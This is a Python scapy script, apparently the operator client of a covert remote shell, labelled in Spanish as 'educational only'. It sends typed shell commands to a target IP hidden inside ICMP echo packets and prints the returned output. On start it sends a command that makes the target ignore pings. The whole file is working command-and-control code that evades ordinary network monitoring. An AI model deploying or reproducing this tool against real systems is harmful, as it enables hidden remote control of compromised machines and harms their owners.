from scapy.all import *
import time
import argparse

interfaces = get_if_list()
for i in interfaces:
    if i == "lo":
        continue
    else:
        interfaz_activa = i
        break




parser = argparse.ArgumentParser(description="Esta es una herramienta que permite ejecutar comandos en remoto a traves del protocolo icmp, solo con fines educativos.",epilog="Ejemplo: sudo python3 icmp.py -t <IP target> -i <interfaz>",add_help=False)
parser.add_argument("-h","--help" ,help="Ayuda (este menu)",action="store_true")
parser.add_argument("-t","--target" ,help="IP del objetivo")
parser.add_argument("-i","--iface",default=interfaz_activa,help=f"Interfaz a usar, default [{interfaz_activa}]")

args = parser.parse_args()


if args.help or not args.target:
    parser.print_help()
    sys.exit()

conf.verb = 0
destino = args.target
interfaz_usada = args.iface
id_icmp = 7777
x = 0
while True:
    if x == 0:
        comando_echo = "/sbin/sysctl -w net.ipv4.icmp_echo_ignore_all=1"
        desactivar_echo = IP(dst=destino,ttl=64)/ICMP(type=8,code=0, id=id_icmp)/comando_echo
        send(desactivar_echo)
        x+=1
    else:    
        comando = input("Comando: ")
        if comando == "exit":
            print(f"Terminando el proceso en maquina remota [{args.target}]")
            pterminar = IP(dst = destino,ttl=64)/ICMP(type=8,code=0,id=id_icmp)/comando
            send(pterminar)
            time.sleep(2)
            sys.exit() 
        paquete = Ether()/IP(dst=destino,ttl=64)/ICMP(type=8,code=0,id=id_icmp)/comando
        respuesta = srp1(paquete,timeout=2,iface=interfaz_usada)
        if respuesta and respuesta.haslayer(Raw):
            respuesta_salida = respuesta[Raw].load.decode("utf-8")
            print(respuesta_salida)








